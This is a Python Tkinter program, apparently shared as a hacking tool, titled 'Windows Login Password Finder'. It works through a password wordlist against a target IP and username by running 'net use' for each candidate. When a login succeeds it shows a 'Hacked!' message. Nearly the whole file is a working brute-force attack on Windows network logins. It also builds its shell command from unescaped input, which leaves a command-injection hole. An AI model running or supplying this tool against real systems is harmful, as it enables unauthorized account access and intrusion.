import os
import shutil
import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter.ttk import Progressbar
from PIL import Image, ImageTk

# تابع برای نمایش باکس
def print_box(message):
    columns = shutil.get_terminal_size().columns
    box_width = columns - 4
    print()
    print(f'╔{"═" * box_width}╗')
    print(f'║{" " * box_width}║')
    print(f'║{message.center(box_width)}║')
    print(f'║{" " * box_width}║')
    print(f'╚{"═" * box_width}╝')

# تابع برای امتحان کردن پسوردها
def try_passwords():
    ip_address = ip_entry.get()
    username = username_entry.get()
    password_file_path = password_entry.get()

    if not ip_address or not username or not password_file_path:
        messagebox.showerror("Error", "Please provide IP address, username, and password file path.")
        return

    # باز کردن فایل و خواندن پسوردها
    with open(password_file_path, 'r') as file:
        passwords = file.readlines()

    # متغیر کمکی برای بررسی پیدا شدن پسورد
    password_found = False

    # تنظیم نوار پیشرفت
    progress_bar['maximum'] = len(passwords)

    # اجرای دستور برای هر پسورد تا زمانی که اتصال موفقیت‌آمیز باشد
    for i, password in enumerate(passwords):
        password = password.strip()  # حذف کاراکترهای اضافی مانند \n
        status_label.config(text=' '*10 + f'{password}'+' '*10)
        root.update_idletasks()
        command = f'net use \\\\{ip_address} /user:{username} {password} >nul 2>&1'
        result = os.system(command)

        if result == 0:  # اگر اتصال موفقیت‌آمیز بود
            print_box(f'Password found: {password}')
            messagebox.showinfo("Hacked!", f'Password: {password}')
            password_found = True
            break

        # به‌روزرسانی نوار پیشرفت
        progress_bar['value'] = i + 1
        root.update_idletasks()

    if not password_found:
        print_box('Password not found!')
        messagebox.showinfo("Failure", 'Password not found!')

# ایجاد واسط گرافیکی با استفاده از Tkinter
root = tk.Tk()
root.title("Windows Login Password Finder by @peymanx")
root.configure(bg='black')

# بارگذاری و نمایش بنر
banner_image = Image.open("./images/login_banner.png")  # مسیر تصویر بنر
banner_photo = ImageTk.PhotoImage(banner_image)
banner_label = tk.Label(root, image=banner_photo, bg='black')
banner_label.grid(row=0, column=0, columnspan=3)

# برچسب و ورودی برای آدرس IP
tk.Label(root, text="IP Address:", bg='black', fg='white').grid(row=1, column=0, padx=10, pady=10)
ip_entry = tk.Entry(root, width=50, bg='black', fg='white')
ip_entry.grid(row=1, column=1, padx=10, pady=10)
ip_entry.insert(0, "127.0.0.1")  # مقدار پیش‌فرض

# برچسب و ورودی برای نام کاربری
tk.Label(root, text="Username:", bg='black', fg='white').grid(row=2, column=0, padx=10, pady=10)
username_entry = tk.Entry(root, width=50, bg='black', fg='white')
username_entry.grid(row=2, column=1, padx=10, pady=10)
username_entry.insert(0, "ali")  # مقدار پیش‌فرض

# برچسب و ورودی برای مسیر فایل پسوردها
tk.Label(root, text="Password File Path:", bg='black', fg='white').grid(row=3, column=0, padx=10, pady=10)
password_entry = tk.Entry(root, width=50, bg='black', fg='white')
password_entry.grid(row=3, column=1, padx=10, pady=10)
password_entry.insert(0, "passwords.txt")  # مقدار پیش‌فرض
tk.Button(root, text="Browse", command=lambda: password_entry.insert(0, filedialog.askopenfilename()), bg='black', fg='white').grid(row=3, column=2, padx=10, pady=10)

# نوار پیشرفت
progress_bar = Progressbar(root, orient='horizontal', length=400, mode='determinate')
progress_bar.grid(row=4, column=0, columnspan=3, pady=10)

# برچسب وضعیت
status_label = tk.Label(root, text="", bg='black', fg='white')
status_label.grid(row=5, column=0, columnspan=3)

# دکمه برای شروع فرآیند پیدا کردن پسورد
tk.Button(root, text="Find Password", command=try_passwords, bg='black', fg='white').grid(row=6, column=0, columnspan=3, pady=20)

root.mainloop()